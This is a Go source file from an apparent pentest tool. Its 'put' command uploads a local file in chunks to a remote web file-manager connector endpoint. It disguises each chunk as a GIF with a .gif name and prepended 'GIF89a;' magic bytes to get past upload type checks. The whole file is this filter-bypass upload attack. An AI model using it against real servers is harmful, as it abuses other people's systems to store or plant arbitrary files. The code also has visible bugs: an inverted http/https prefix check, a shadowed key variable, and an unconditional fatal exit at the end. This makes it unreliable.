/*
Copyright Â© 2022 Himadri Bhattacharjee <cz7047@protonmail.com>

*/
package cmd

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"github.com/7047payloads/pentest/nolabs/constants"
	"github.com/7047payloads/pentest/nolabs/metadata"
	"github.com/cheggaaa/pb/v3"
	"github.com/google/uuid"
	"github.com/spf13/cobra"
	"io"
	"io/ioutil"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"strings"
)

// putCmd represents the put command
var putCmd = &cobra.Command{
	Use:   "put <file> <endpoint>",
	Short: "",
	Long:  ``,
	RunE: func(cmd *cobra.Command, args []string) error {
		if len(args) < 2 {
			return fmt.Errorf("A filepath and an endpoint are to be supplied")
		}
		endpoint := args[1]
		if !strings.HasPrefix(endpoint, "https://") || !strings.HasPrefix(endpoint, "http://") {
			endpoint = "https://" + endpoint
		}
		if !strings.HasSuffix(endpoint, "/") {
			endpoint += "/"
		}
		put(endpoint, args[0])
		return nil
	},
}

var key, uri string

func init() {
	rootCmd.AddCommand(putCmd)
}

func uploadChunk(chunk []byte, result chan<- error, i ...int64) {
	client := &http.Client{}
	b := &bytes.Buffer{}
	w := multipart.NewWriter(b)
	req := &http.Request{}
	r := &http.Response{}
	var p io.Writer
	var err error

	if len(i) == 0 {
		p, err = w.CreateFormFile("NewFile", fmt.Sprintf("%s.gif", key))
	} else {
		p, err = w.CreateFormFile("NewFile", fmt.Sprintf("%s_%d.gif", key, i[0]))
	}
	if err != nil {
		result <- err
		return
	}
	fmt.Fprintf(p, "GIF89a;\n")
	p.Write(chunk)
	w.Close()

	if req, err = http.NewRequest("POST", uri, b); err != nil {
		result <- err
	}
	req.Header.Add("Content-Type", w.FormDataContentType())

	if r, err = client.Do(req); err != nil {
		result <- err
	}
	defer r.Body.Close()

	if _, err = io.Copy(b, r.Body); err != nil {
		result <- err
	}
	if !strings.Contains(b.String(), ".gif") {
		result <- errors.New("Endpoint returned negative response")
	}
	result <- nil
}

func put(endpoint, filePath string) {
	key := uuid.New().String()
	branch := fmt.Sprintf("%s%s", endpoint, constants.Connector)
	http.Get(fmt.Sprintf("%s%s%s", branch, constants.NewFolder, key))
	uri = fmt.Sprintf("%s%s%s", branch, key, constants.Upload)
	wait := make(chan error)
	File, err := os.Open(filePath)
	if err != nil {
		log.Fatalln(err)
	}
	defer File.Close()

	stat, err := File.Stat()
	if err != nil {
		log.Fatalln(err)
	}

	// We'll divide the file into 512KiB chunks
	meta := metadata.Meta{filepath.Base(filePath), 1 + stat.Size()>>19}
	bar := pb.ProgressBarTemplate(constants.BarTemplate).Start64(meta.Chunks + 1)
	bar.Set("statement", fmt.Sprintf("uploading %s", meta.Name))

	Marshaled, err := json.Marshal(&meta)
	if err != nil {
		log.Fatalln(err)
	}
	FileContent, err := ioutil.ReadAll(File)
	if err != nil {
		log.Fatalln(err)
	}
	go uploadChunk(Marshaled, wait)
	if err := <-wait; err != nil {
		log.Fatalln(err)
	}
	var i int64
	for ; i < meta.Chunks-1; i += constants.Threads {
		for j := int64(0); j < constants.Threads; j++ {
			go uploadChunk(FileContent[(i+j)<<19:(i+j+1)<<19], wait, i+j)
		}
		for j := int64(0); j < constants.Threads; j++ {
			if err := <-wait; err != nil {
				log.Fatalln(err)
			}
			bar.Increment()
		}
	}
	go uploadChunk(FileContent[i<<19:], wait, i)
	if err := <-wait; err != nil {
		log.Fatalln(err)
	}
	bar.Finish()
	fmt.Printf("Key: %s\n", key)
	log.Fatalln(err)
}
